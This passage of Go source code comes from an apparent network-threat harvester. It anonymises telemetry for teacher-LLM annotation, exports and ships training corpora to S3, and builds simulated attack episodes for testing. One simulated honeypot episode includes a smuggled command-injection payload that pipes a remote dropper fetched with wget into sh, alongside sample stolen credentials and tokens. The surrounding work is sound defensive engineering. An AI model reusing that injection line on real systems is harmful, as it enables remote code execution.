// recommended MCP tool from the reply is only stored, never executed.
func (m *ThreatHarvesterManager) AnnotateEpisodeWithTeacherLLM(ctx context.Context, id string) (*ThreatEpisode, error) {
	m.mu.RLock()
	fullCfg := m.cfg
	cfg := m.cfg.TeacherLlm
	var target *ThreatEpisode
	for i := range m.episodes {
		if m.episodes[i].ID == id {
			cp := m.episodes[i]
			target = &cp
			break
		}
	}
	m.mu.RUnlock()

	if target == nil {
		return nil, fmt.Errorf("episode %s not found", id)
	}
	if !cfg.Enabled || strings.TrimSpace(cfg.Endpoint) == "" {
		return nil, fmt.Errorf("teacher LLM annotator is disabled in configuration")
	}

	// R4-A-M7: anonymize IPs, SNI, and the Causal DSL before building
	// the teacher prompt. Fail closed if the anonymizer cannot be
	// built — shipping raw telemetry because anonymization errored
	// would silently defeat the control.
	promptSrcIP, promptDstIP, promptDsl := target.SrcIP, target.DstIP, target.CausalDsl
	if !cfg.AllowRawTelemetry {
		anon, err := NewCryptoPanAnonymizer(fullCfg.AnonymizationSalt, filepath.Join(fullCfg.SpoolDir, ".anon_salt"))
		if err != nil {
			return nil, fmt.Errorf("teacher LLM anonymizer unavailable: %w", err)
		}
		promptSrcIP = anon.AnonymizeIP(target.SrcIP)
		promptDstIP = anon.AnonymizeIP(target.DstIP)
		if target.SNI != "" {
			promptDsl = strings.ReplaceAll(promptDsl, target.SNI, anon.AnonymizeHostname(target.SNI))
		}
		promptDsl = anon.AnonymizeText(promptDsl)
	}

	m.teacherMu.Lock()
	now := time.Now().UTC()
	cutoff := now.Add(-1 * time.Hour)
	kept := m.teacherCallHist[:0]
	for _, ts := range m.teacherCallHist {
		if ts.After(cutoff) {
			kept = append(kept, ts)
		}
	}
	m.teacherCallHist = kept
	maxCalls := cfg.MaxCallsPerHour
	if maxCalls <= 0 {
		maxCalls = 30
	}
	if len(m.teacherCallHist) >= maxCalls {
		m.teacherMu.Unlock()
		return nil, fmt.Errorf("teacher LLM hourly budget exceeded (%d/%d calls in last 1h)", len(m.teacherCallHist), maxCalls)
	}
	m.teacherCallHist = append(m.teacherCallHist, now)
	m.teacherMu.Unlock()

	reqBody, _ := json.Marshal(map[string]any{
		"model": cfg.Model,
		"messages": []map[string]string{
			{
				"role":    "system",
				"content": "You are a senior SOC Threat Researcher writing concise gold-standard reasoning traces and MITRE ATT&CK tags for NGFW training datasets. Respond in JSON with keys: reasoningTrace, mitreAttack (array of strings), recommendedMcpTool.",
			},
			{
				"role":    "user",
				"content": fmt.Sprintf("Episode %s (%s -> %s:%d):\n%s", target.ID, promptSrcIP, promptDstIP, target.DstPort, promptDsl),
			},
		},
		"temperature": 0.1,
	})

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, cfg.Endpoint, bytes.NewReader(reqBody))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	if cfg.ApiKey != "" {
		req.Header.Set("Authorization", "Bearer "+cfg.ApiKey)
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("teacher LLM request failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		errBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return nil, fmt.Errorf("teacher LLM returned HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(errBytes)))
	}

	var parsed struct {
		Choices []struct {
			Message struct {
				Content string `json:"content"`
			} `json:"message"`
		} `json:"choices"`
	}
	if err := json.NewDecoder(io.LimitReader(resp.Body, 256*1024)).Decode(&parsed); err != nil {
		return nil, err
	}
	if len(parsed.Choices) == 0 {
		return nil, fmt.Errorf("teacher LLM returned zero completion choices")
	}

	content := strings.TrimSpace(parsed.Choices[0].Message.Content)
	var llmOut struct {
		ReasoningTrace     string   `json:"reasoningTrace"`
		MitreAttack        []string `json:"mitreAttack"`
		RecommendedMcpTool string   `json:"recommendedMcpTool"`
	}
	if err := json.Unmarshal([]byte(content), &llmOut); err != nil {
		llmOut.ReasoningTrace = content
	}

	m.mu.Lock()
	defer m.mu.Unlock()
	for i := range m.episodes {
		if m.episodes[i].ID == id {
			if llmOut.ReasoningTrace != "" {
				m.episodes[i].ReasoningTrace = llmOut.ReasoningTrace
			}
			if len(llmOut.MitreAttack) > 0 {
				m.episodes[i].MitreAttack = llmOut.MitreAttack
			}
			if llmOut.RecommendedMcpTool != "" {
				m.episodes[i].RecommendedMcpTool = llmOut.RecommendedMcpTool
			}
			m.episodes[i].OracleSources = appendIfMissing(m.episodes[i].OracleSources, "teacher_llm")
			_ = m.writeEpisodeShardLocked(&m.episodes[i])
			_ = m.saveIndexLocked()
			cp := m.episodes[i]
			return &cp, nil
		}
	}
	return nil, fmt.Errorf("episode %s vanished before update", id)
}

func appendIfMissing(slice []string, item string) []string {
	for _, s := range slice {
		if s == item {
			return slice
		}
	}
	return append(slice, item)
}

// ExportCorpusTarZst packages all harvested episodes into a dual-track dataset archive
// (.tar.zst) containing manifest.json, train.jsonl, val.jsonl, and features.parquet.
func (m *ThreatHarvesterManager) ExportCorpusTarZst(w io.Writer, anonymize bool) error {
	m.mu.RLock()
	cfg := m.cfg
	eps := make([]ThreatEpisode, len(m.episodes))
	copy(eps, m.episodes)
	m.mu.RUnlock()

	var anon *CryptoPanAnonymizer
	if anonymize {
		var err error
		anon, err = NewCryptoPanAnonymizer(cfg.AnonymizationSalt, filepath.Join(cfg.SpoolDir, ".anon_salt"))
		if err != nil {
			return err
		}
	}

	// R4-A-M5: simulated episodes never enter the exported training
	// corpus — they are pipeline test data, not labelled ground
	// truth. (ShipCorpusToS3 funnels through here, so it inherits
	// the exclusion.)
	exported := make([]ThreatEpisode, 0, len(eps))
	for _, ep := range eps {
		if !ep.Simulated {
			exported = append(exported, ep)
		}
	}
	eps = exported

	var trainBuf, valBuf bytes.Buffer
	pqRows := make([]ThreatParquetRow, 0, len(eps))
	distinctSubnets := make(map[string]bool)
	for _, ep := range eps {
		distinctSubnets[extractSubnetPrefix(ep.SrcIP)] = true
	}

	trainCount := 0
	valCount := 0
	for idx, ep := range eps {
		sft := episodeToSftExample(ep, anon)
		line, _ := json.Marshal(sft)
		pqRows = append(pqRows, episodeToParquetRow(ep, anon))

		isVal := false
		if len(eps) > 1 {
			if len(distinctSubnets) > 2 {
				sum := sha256.Sum256([]byte(sft.SrcSubnetPrefix))
				if sum[0]%100 < 15 {
					isVal = true
				}
			} else if idx%7 == 6 {
				isVal = true
			}
		}
		if isVal {
			valBuf.Write(line)
			valBuf.WriteByte('\n')
			valCount++
		} else {
			trainBuf.Write(line)
			trainBuf.WriteByte('\n')
			trainCount++
		}
	}

	var pqBuf bytes.Buffer
	if err := WriteThreatFeatureParquet(&pqBuf, pqRows); err != nil {
		return err
	}

	manifestBytes, _ := json.MarshalIndent(map[string]any{
		"formatVersion": "1.0",
		"generatedAt":   time.Now().UTC().Format(time.RFC3339),
		"anonymized":    anonymize,
		"totalEpisodes": len(eps),
		"trainExamples": trainCount,
		"valExamples":   valCount,
		"files":         []string{"train.jsonl", "val.jsonl", "features.parquet"},
	}, "", "  ")

	zw, err := zstd.NewWriter(w)
	if err != nil {
		return err
	}
	tw := tar.NewWriter(zw)

	writeEntry := func(name string, data []byte) error {
		hdr := &tar.Header{
			Name:    name,
			Mode:    0644,
			Size:    int64(len(data)),
			ModTime: time.Now().UTC(),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			return err
		}
		_, err := tw.Write(data)
		return err
	}

	if err := writeEntry("manifest.json", manifestBytes); err != nil {
		_ = tw.Close()
		_ = zw.Close()
		return err
	}
	if err := writeEntry("train.jsonl", trainBuf.Bytes()); err != nil {
		_ = tw.Close()
		_ = zw.Close()
		return err
	}
	if err := writeEntry("val.jsonl", valBuf.Bytes()); err != nil {
		_ = tw.Close()
		_ = zw.Close()
		return err
	}
	if err := writeEntry("features.parquet", pqBuf.Bytes()); err != nil {
		_ = tw.Close()
		_ = zw.Close()
		return err
	}
	if err := tw.Close(); err != nil {
		_ = zw.Close()
		return err
	}
	return zw.Close()
}

func hmacSHA256(key []byte, data string) []byte {
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(data))
	return mac.Sum(nil)
}

func canonicalS3HostHeader(u *url.URL) string {
	host := u.Host
	if u.Scheme == "https" && strings.HasSuffix(host, ":443") {
		return strings.TrimSuffix(host, ":443")
	}
	if u.Scheme == "http" && strings.HasSuffix(host, ":80") {
		return strings.TrimSuffix(host, ":80")
	}
	return host
}

func s3UriEncodePath(rawPath string) string {
	if rawPath == "" {
		return "/"
	}
	var out strings.Builder
	for i := 0; i < len(rawPath); i++ {
		ch := rawPath[i]
		isUnreserved := (ch >= 'A' && ch <= 'Z') ||
			(ch >= 'a' && ch <= 'z') ||
			(ch >= '0' && ch <= '9') ||
			ch == '-' || ch == '_' || ch == '.' || ch == '~' || ch == '/'
		if isUnreserved {
			out.WriteByte(ch)
		} else {
			fmt.Fprintf(&out, "%%%02X", ch)
		}
	}
	return out.String()
}

// ShipCorpusToS3 exports a `.tar.zst` bundle and uploads it to the configured
// Axonwall Vault / MinIO / S3 bucket using stdlib AWS Signature V4.
func (m *ThreatHarvesterManager) ShipCorpusToS3(ctx context.Context) (string, error) {
	m.mu.RLock()
	cfg := m.cfg
	m.mu.RUnlock()

	ship := cfg.FleetShipper
	if strings.TrimSpace(ship.Endpoint) == "" || strings.TrimSpace(ship.Bucket) == "" {
		return "", fmt.Errorf("fleet S3 shipper requires endpoint and bucket")
	}

	var payload bytes.Buffer
	if err := m.ExportCorpusTarZst(&payload, cfg.AnonymizeOnExport); err != nil {
		return "", err
	}
	bodyBytes := payload.Bytes()

	hostName, _ := os.Hostname()
	if hostName == "" {
		hostName = "axonwall-node"
	}
	now := time.Now().UTC()
	prefix := strings.Trim(ship.Prefix, "/")
	keyName := fmt.Sprintf("%s/%s-%s.tar.zst", hostName, now.Format("20060102T150405Z"), "corpus")
	if prefix != "" {
		keyName = prefix + "/" + keyName
	}

	baseURL, err := url.Parse(strings.TrimRight(ship.Endpoint, "/"))
	if err != nil {
		return "", fmt.Errorf("invalid S3 endpoint URL: %w", err)
	}
	// R4-A-L6: a plaintext http:// endpoint ships the corpus readable
	// on the wire. Refuse by default; a local MinIO-over-HTTP setup
	// must opt in explicitly (FleetShipper.AllowPlaintextEndpoint),
	// and even then the shipment is logged loudly.
	if baseURL.Scheme != "https" {
		if !ship.AllowPlaintextEndpoint {
			return "", fmt.Errorf("refusing to ship corpus to plaintext S3 endpoint %q (scheme %q): set fleetShipper.allowPlaintextEndpoint=true explicitly for a local plaintext endpoint", ship.Endpoint, baseURL.Scheme)
		}
		log.Printf("[ThreatHarvester] WARNING: shipping corpus to plaintext S3 endpoint %q (allowPlaintextEndpoint opt-in); the corpus travels unencrypted", ship.Endpoint)
	}
	if ship.UsePathStyle {
		baseURL.Path = strings.TrimRight(baseURL.Path, "/") + "/" + ship.Bucket + "/" + keyName
	} else {
		baseURL.Host = ship.Bucket + "." + baseURL.Host
		baseURL.Path = strings.TrimRight(baseURL.Path, "/") + "/" + keyName
	}

	payloadSum := sha256.Sum256(bodyBytes)
	payloadHash := hex.EncodeToString(payloadSum[:])
	amzDate := now.Format("20060102T150405Z")
	dateStamp := now.Format("20060102")
	region := ship.Region
	if region == "" {
		region = "us-east-1"
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPut, baseURL.String(), bytes.NewReader(bodyBytes))
	if err != nil {
		return "", err
	}
	req.ContentLength = int64(len(bodyBytes))
	req.Header.Set("Content-Type", "application/zstd")
	req.Header.Set("X-Amz-Date", amzDate)
	req.Header.Set("X-Amz-Content-Sha256", payloadHash)

	if ship.AccessKey != "" && ship.SecretKey != "" {
		canonicalHost := canonicalS3HostHeader(baseURL)
		req.Host = canonicalHost
		canonicalURI := s3UriEncodePath(baseURL.Path)
		canonicalHeaders := fmt.Sprintf("host:%s\nx-amz-content-sha256:%s\nx-amz-date:%s\n",
			canonicalHost, payloadHash, amzDate)
		signedHeaders := "host;x-amz-content-sha256;x-amz-date"
		canonicalRequest := fmt.Sprintf("PUT\n%s\n\n%s\n%s\n%s",
			canonicalURI, canonicalHeaders, signedHeaders, payloadHash)
		reqSum := sha256.Sum256([]byte(canonicalRequest))
		scope := fmt.Sprintf("%s/%s/s3/aws4_request", dateStamp, region)
		stringToSign := fmt.Sprintf("AWS4-HMAC-SHA256\n%s\n%s\n%s",
			amzDate, scope, hex.EncodeToString(reqSum[:]))

		kDate := hmacSHA256([]byte("AWS4"+ship.SecretKey), dateStamp)
		kRegion := hmacSHA256(kDate, region)
		kService := hmacSHA256(kRegion, "s3")
		kSigning := hmacSHA256(kService, "aws4_request")
		sig := hex.EncodeToString(hmacSHA256(kSigning, stringToSign))
		req.Header.Set("Authorization", fmt.Sprintf("AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s",
			ship.AccessKey, scope, signedHeaders, sig))
	}

	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		m.mu.Lock()
		m.cfg.FleetShipper.LastError = err.Error()
		m.mu.Unlock()
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		errBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		errMsg := fmt.Sprintf("S3 PUT HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(errBytes)))
		m.mu.Lock()
		m.cfg.FleetShipper.LastError = errMsg
		m.mu.Unlock()
		return "", errors.New(errMsg)
	}

	m.mu.Lock()
	m.cfg.FleetShipper.LastShippedAt = now.Format(time.RFC3339)
	m.cfg.FleetShipper.LastShippedKey = keyName
	m.cfg.FleetShipper.LastError = ""
	m.mu.Unlock()
	return keyName, nil
}

// InjectSimulatedEpisode exercises the live scrubber, Parquet writer, zstd JSONL
// spool, and multi-oracle correlator on non-privileged dev/CI environments.
func (m *ThreatHarvesterManager) InjectSimulatedEpisode(scenario string) (*ThreatEpisode, error) {
	now := time.Now().UTC()
	var ep ThreatEpisode

	m.mu.RLock()
	pinGold := m.cfg.PinGoldEpisodes
	m.mu.RUnlock()

	switch scenario {
	case "dns_c2_exfil":
		ep = ThreatEpisode{
			ID:                 fmt.Sprintf("sim-dnsc2-%d", now.UnixMilli()),
			CreatedAt:          now.Format(time.RFC3339),
			TimestampUnixMs:    now.UnixMilli(),
			LabelTier:          "silver_malicious",
			ReviewStatus:       "pending",
			VerdictScore:       0.89,
			OracleSources:      []string{"ebpf_dns_entropy", "suricata_sid:2038911"},
			MitreAttack:        []string{"T1071.004", "T1048"},
			SrcIP:              "10.42.0.29",
			DstIP:              "198.51.100.77",
			SrcPort:            51842,
			DstPort:            53,
			Proto:              17,
			ProtoName:          "UDP",
			PktCount:           24,
			ByteCount:          4810,
			DurationMs:         1840.2,
			DnsEntropy:         4.62,
			JA4T:               "0_0_w0",
			SNI:                "a9f3e2c8b1.beacon-c2.example",
			CgroupID:           9182311,
			ProcComm:           "curl",
			ProcPid:            18244,
			PktSizes:           []int16{118, -240, 122, -244, 118, -240},
			IatUs:              []uint32{0, 1240, 500100, 1310, 500040, 1190},
			ScrubbedPayload:    "TXT query a9f3e2c8b1d4.exfil.example Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
			CausalDsl:          "[T+0.000s] WIRE_FLOW src=10.42.0.29:51842 -> dst=198.51.100.77:53 proto=UDP cookie=0x90a12\n[T+0.500s] BPF_DNS_ENTROPY score=4.62bits periodic_iat=500ms\n[T+1.200s] HOST_PROC comm=\"curl\" pid=18244 cgroup_id=9182311\n[T+1.840s] ORACLE_VERDICT suricata_sid=2038911",
			ReasoningTrace:     "Compromised container workload emitting periodic 500ms DNS TXT beacons with high Shannon entropy (4.62 bits/char) correlating with Suricata ET TROJAN DNS exfiltration SID 2038911.",
			RecommendedMcpTool: `sinkhole_dns({"domain":"exfil.example","ttlSeconds":3600,"reason":"High-entropy DNS C2 exfiltration"})`,
		}
	case "credential_stuffing_redacted":
		ep = ThreatEpisode{
			ID:                 fmt.Sprintf("sim-cred-%d", now.UnixMilli()),
			CreatedAt:          now.Format(time.RFC3339),
			TimestampUnixMs:    now.UnixMilli(),
			LabelTier:          "silver_malicious",
			ReviewStatus:       "pending",
			VerdictScore:       0.85,
			OracleSources:      []string{"xdp_soar_blocklist", "tls_uprobe_cleartext"},
			MitreAttack:        []string{"T1110.004"},
			SrcIP:              "203.0.113.55",
			DstIP:              "192.168.10.12",
			SrcPort:            49210,
			DstPort:            443,
			Proto:              6,
			ProtoName:          "TCP",
			PktCount:           14,
			ByteCount:          3120,
			DurationMs:         320.5,
			JA4T:               "64240_2-1460_w7",
			SNI:                "portal.internal",
			CgroupID:           44120,
			ProcComm:           "haproxy",
			ProcPid:            2104,
			PktSizes:           []int16{-60, 60, -52, -412, 318, -52},
			IatUs:              []uint32{0, 180, 120, 410, 8900, 95},
			ScrubbedPayload:    "POST /api/login HTTP/1.1\nHost: portal.internal\nemail=alice@corp.example&password=Hunter2!Secret99&api_key=sk-test-1234567890abcdefghijklmnop",
			CausalDsl:          "[T+0.000s] WIRE_FLOW src=203.0.113.55:49210 -> dst=192.168.10.12:443 proto=TCP ja4t=64240_2-1460_w7 sni=portal.internal\n[T+0.014s] TLS_UPROBE_CLEARTEXT pid=2104 comm=\"haproxy\" pre-disk PII scrubbed\n[T+0.320s] ORACLE_VERDICT xdp_soar_blocklist HTTP 401 surge",
			ReasoningTrace:     "Rapid automated POST /api/login credential stuffing over headless Python/Go TLS fingerprint; inline pre-disk scrubber removed email, password, and API key before storage.",
			RecommendedMcpTool: `shape_traffic({"target":"203.0.113.55/32","rateKbps":32,"latencyMs":800,"ttlSeconds":1800,"reason":"HTTP auth credential stuffing tarpit"})`,
		}
	case "benign_k3s_egress":
		ep = ThreatEpisode{
			ID:                 fmt.Sprintf("sim-benign-%d", now.UnixMilli()),
			CreatedAt:          now.Format(time.RFC3339),
			TimestampUnixMs:    now.UnixMilli(),
			LabelTier:          "benign_sampled",
			ReviewStatus:       "pending",
			VerdictScore:       0.03,
			OracleSources:      []string{"stratified_benign_negative"},
			MitreAttack:        []string{},
			SrcIP:              "10.42.0.10",
			DstIP:              "192.168.10.1",
			SrcPort:            54822,
			DstPort:            443,
			Proto:              6,
			ProtoName:          "TCP",
			PktCount:           12,
			ByteCount:          5120,
			DurationMs:         42.1,
			JA4T:               "64240_2-1460_w7",
			SNI:                "metrics.axonwall.local",
			CgroupID:           104421,
			ProcComm:           "coredns",
			ProcPid:            1922,
			PktSizes:           []int16{60, -60, 52, 517, -1420, 52},
			IatUs:              []uint32{0, 110, 45, 220, 1800, 75},
			ScrubbedPayload:    "TLSv1.3 ClientHello SNI=metrics.axonwall.local ALPN=h2,http/1.1",
			CausalDsl:          "[T+0.000s] WIRE_FLOW src=10.42.0.10:54822 -> dst=192.168.10.1:443 proto=TCP ja4t=64240_2-1460_w7\n[T+0.011s] HOST_PROC comm=\"coredns\" pid=1922 memfd=false\n[T+0.042s] ORACLE_VERDICT stratified_benign_negative",
			ReasoningTrace:     "Stratified benign negative sample: clean K3s pod HTTPS handshake with zero dark-port, LSM, or IDS triggers.",
			RecommendedMcpTool: "none (benign baseline verified)",
		}
	case "honeypot_rce_memfd":
		ep = ThreatEpisode{
			ID:                 fmt.Sprintf("sim-gold-rce-%d", now.UnixMilli()),
			CreatedAt:          now.Format(time.RFC3339),
			TimestampUnixMs:    now.UnixMilli(),
			LabelTier:          "gold_malicious",
			ReviewStatus:       "pinned_gold",
			Pinned:             pinGold,
			VerdictScore:       0.99,
			OracleSources:      []string{"canary_dark_port", "mcp_dnat_honeypot", "lsm_guard_eperm"},
			MitreAttack:        []string{"T1190", "T1620", "T1014"},
			SrcIP:              "198.51.100.44",
			DstIP:              "192.168.10.250",
			SrcPort:            38912,
			DstPort:            2323,
			Proto:              6,
			ProtoName:          "TCP",
			PktCount:           19,
			ByteCount:          2840,
			DurationMs:         215.4,
			JA4T:               "29200_2-1460_w7",
			CgroupID:           772104,
			ProcComm:           "sh",
			ProcPid:            9412,
			MemfdExec:          true,
			PktSizes:           []int16{-60, 60, -52, -184, 96, -52, -310, 64},
			IatUs:              []uint32{0, 90, 60, 340, 210, 80, 12500, 110},
			ScrubbedPayload:    "POST /cgi-bin/luci HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\ncmd=; wget http://198.51.100.44/dropper.bin -O - | sh",
			CausalDsl:          "[T+0.000s] WIRE_FLOW src=198.51.100.44:38912 -> dst=192.168.10.250:2323 proto=TCP cookie=0x771a40 ja4t=29200_2-1460_w7\n[T+0.018s] DARK_PORT_HIT port=2323 -> Tier-1 escalation + watchlist 300s\n[T+0.064s] HOST_PROC comm=\"sh\" pid=9412 cgroup_id=772104 memfd=true (sys_enter_memfd_create)\n[T+0.112s] LSM_GUARD EPERM blocked unallowlisted io_uring/bpf attempt pid=9412\n[T+0.215s] ORACLE_VERDICT tier=gold_malicious sources=[canary_dark_port,mcp_dnat_honeypot,lsm_guard_eperm]",
			ReasoningTrace:     "External scanner probed canary port 2323, hit DNAT honeypot, injected shell command dropper payload (`wget ... | sh`), and attempted fileless execution via memfd_create before Ring-0 LSM guard blocked escalation.",
			RecommendedMcpTool: `blackhole_traffic({"target":"198.51.100.44/32","mode":"nft_drop","direction":"both","ttlSeconds":86400,"reason":"Confirmed honeypot RCE + fileless memfd attempt"})`,
		}
	default:
		// R4-A-M5: the unknown-scenario default used to build a
		// `gold_malicious`, `pinned_gold` episode — a typo in the
		// scenario name manufactured a permanent gold-malicious
		// exemplar. Anything unknown is now an error instead.
		return nil, fmt.Errorf("unknown simulation scenario %q (known: dns_c2_exfil, credential_stuffing_redacted, benign_k3s_egress, honeypot_rce_memfd)", scenario)
	}

	// R4-A-M5: mark simulated episodes so the export path can exclude
	// them from the live training corpus.
	ep.Simulated = true

	if err := m.RecordEpisode(ep); err != nil {
		return nil, err
	}
	m.mu.RLock()
	defer m.mu.RUnlock()
	if len(m.episodes) > 0 {
		last := m.episodes[len(m.episodes)-1]
		return &last, nil
	}
	return &ep, nil
}

func (m *ThreatHarvesterManager) SnapshotStatus() ThreatHarvesterStatusSnapshot {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var stats ThreatHarvesterStats
	if m.bpfLoaded && m.objs.HarvesterCounters != nil {
		var perCpu []axebpf.ThreatHarvesterHarvesterCountersVal
		zero := uint32(0)
		if err := m.objs.HarvesterCounters.Lookup(&zero, &perCpu); err == nil {
			for _, cpuVal := range perCpu {
				stats.PacketsSeen += cpuVal.PacketsSeen
				stats.Tier0Events += cpuVal.Tier0Events
				stats.Tier1PayloadEvents += cpuVal.Tier1PayloadEvents
				stats.RingbufDrops += cpuVal.RingbufDrops
				stats.DarkPortHits += cpuVal.DarkPortHits
				stats.MemfdAlerts += cpuVal.MemfdAlerts
				stats.TlsUprobeEvents += cpuVal.TlsUprobeEvents
			}
		}
	}

	stats.TotalEpisodes = len(m.episodes)
	for _, ep := range m.episodes {
		switch ep.LabelTier {
		case "gold_malicious":
			stats.GoldEpisodes++
		case "silver_malicious":
			stats.SilverEpisodes++
		case "benign_sampled":
			stats.BenignEpisodes++
		}
		if ep.Pinned {
			stats.PinnedEpisodes++
		}
		if ep.ReviewStatus == "pending" {
			stats.PendingReview++
		}
		stats.RedactedSecrets += uint64(ep.RedactionCount)
	}
	stats.RecordFailures = m.recordFailures.Load()
	stats.SpoolUsedBytes = m.computeSpoolBytesLocked()
	stats.SpoolQuotaBytes = m.quotaLimitBytesLocked()
	stats.ZfsBacked, _ = isMountZfs(m.cfg.SpoolDir)
	stats.BackpressureTripped = m.backpressureActive.Load()

	excludedList := make([]string, 0, len(excludedUprobeBinaries))
	for name := range excludedUprobeBinaries {
		excludedList = append(excludedList, name)
	}
	sort.Strings(excludedList)

	attachedIfs := append([]string{}, m.attachedIfs...)
	activeHooks := append([]string{}, m.activeHooks...)

	return ThreatHarvesterStatusSnapshot{
		Config:                m.cfg,
		BpfAttached:           m.bpfLoaded && len(activeHooks) > 0,
		AttachedInterfaces:    attachedIfs,
		ActiveHooks:           activeHooks,
		ExcludedUprobeDaemons: excludedList,
		BpfLoadError:          m.bpfLoadErr,
		Stats:                 stats,
		Timestamp:             time.Now().UTC().Format(time.RFC3339),
	}
}

func (m *ThreatHarvesterManager) GetCompactSummary() map[string]any {
	snap := m.SnapshotStatus()
	return map[string]any{
		"enabled":         snap.Config.Enabled,
		"captureMode":     snap.Config.CaptureMode,
		"bpfAttached":     snap.BpfAttached,
		"totalEpisodes":   snap.Stats.TotalEpisodes,
		"goldEpisodes":    snap.Stats.GoldEpisodes,
		"silverEpisodes":  snap.Stats.SilverEpisodes,
		"spoolUsedBytes":  snap.Stats.SpoolUsedBytes,
		"spoolQuotaBytes": snap.Stats.SpoolQuotaBytes,
	}
}
